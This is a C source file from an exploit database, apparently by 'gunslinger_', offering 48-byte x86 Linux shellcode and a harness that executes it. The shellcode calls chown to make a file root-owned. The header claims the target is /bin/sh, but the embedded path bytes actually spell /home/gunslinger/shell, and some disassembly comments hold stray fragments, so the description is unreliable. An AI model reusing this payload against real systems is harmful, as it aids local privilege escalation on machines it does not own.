/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Name   : 48 bytes chown root:root /bin/sh x86 linux shellcode
Date   : Sat Jun  5 15:32:40 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org)
greetz to : flyff666, whitehat, ketek, chaer, peneter, and all devilzc0de crew
*/
#include <stdio.h>

char *shellcode=
		"\xeb\x13"                    /* jmp    0x8048075 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\xb6"                    /* mov    $0xb6,%al */
		"\x5b"                        /* pop    %ebx */
		"\x31\xc9"                    /* xor    %ecx,%ecx */
		"\x31\xd2"                    /* xor    %edx,%edx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x01"                    /* mov    $0x1,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\xe8\xe8\xff\xff\xff"        /* call   0x8048062 */
		"\x2f"                        /* das     */
		"\x68\x6f\x6d\x65\x2f"        /* push   $0x2f656d6f */
		"\x67\x75\x6e"                /* addr16 jne 0x80480f1 */
		"\x73\x6c"                    /* jae    0x80480f1 */
		"\x69\x6e\x67\x65\x72\x2f\x73"/* imul   $0x732f7265,0x67(%esi),%ebp */
		"\x68"                        /* .byte 0x68 */
		"\x65"                        /* gs */
		"\x6c"                        /* insb   (%dx),%es		"(%edi) */
		"\x6c";                       /* insb   (%dx),%es		"(%edi) */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}